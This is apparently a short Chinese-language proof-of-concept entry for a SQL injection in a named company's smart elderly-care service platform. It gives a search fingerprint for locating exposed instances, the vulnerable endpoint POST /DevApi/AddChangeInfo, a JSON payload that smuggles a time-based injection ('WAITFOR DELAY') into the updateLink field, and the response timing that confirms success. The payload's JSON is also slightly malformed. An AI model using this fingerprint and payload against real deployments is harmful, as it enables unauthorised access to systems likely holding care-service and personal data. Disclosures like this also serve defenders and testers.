# 广西金中软件集团有限公司智慧医养服务平台AddChangeInfo存在SQL注入漏洞

广西金中软件集团有限公司智慧医养服务平台 ｜ SQL注入 ｜ —
- **指纹**：`body="Content/css/Login/images/gtx-main-bg00004.png"`
- **请求**：`POST /DevApi/AddChangeInfo HTTP/1.1`

**Payload**
```
"updateType": "someType",
"updateData": [],
"productName": "test",
"moduleName": "test",
"updateLink": "1';WAITFOR DELAY '0:0:5'--",
"taskMsg": "test"
}
```
- **响应特征**：200 响应时间>=5s